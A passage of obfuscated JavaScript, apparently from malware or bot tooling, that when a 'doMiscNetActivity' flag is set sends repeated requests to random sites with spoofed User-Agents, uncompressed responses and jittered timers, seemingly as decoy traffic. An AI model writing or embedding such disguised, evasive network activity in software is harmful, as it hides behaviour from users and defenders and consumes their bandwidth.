    setTimeout(f, (0x5 * 0x57f5 + 0x991b + -0x2 * 0xb342) * k * getRandomInt(0x129 * 0x1b + 0x6f1 + -0xcc1 * 0x3, -0x1 * -0x1f76 + 0x3 * -0x93d + -0x3bc));
  setInterval(() => {
    f();
    for (let l = -0x1e3c + -0x3e5 * 0x5 + 0x31b5; l < -0x1 * 0x3c5 + -0x1 * 0x865 + 0x617 * 0x2; l++)
      setTimeout(f, (0x37f0 + -0x1 * 0x11bd + 0xc42d * 0x1) * l * getRandomInt(0x80f + 0x2cd * 0x1 + -0xadb, 0x138 + 0x7 * -0x51 + 0x102));
  }, -0x302acd + 0x45888 + -0x62c0c5 * -0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x3 * -0xd78 + 0x29 * 0xe + -0xf4e) * getRandomInt(-0x5f8 + -0x3a + 0x633, -0x187d * -0x1 + 0xa2 + -0x191a));
}, -0x25 * 0x61 + 0x222c + 0x1 * -0x13c3);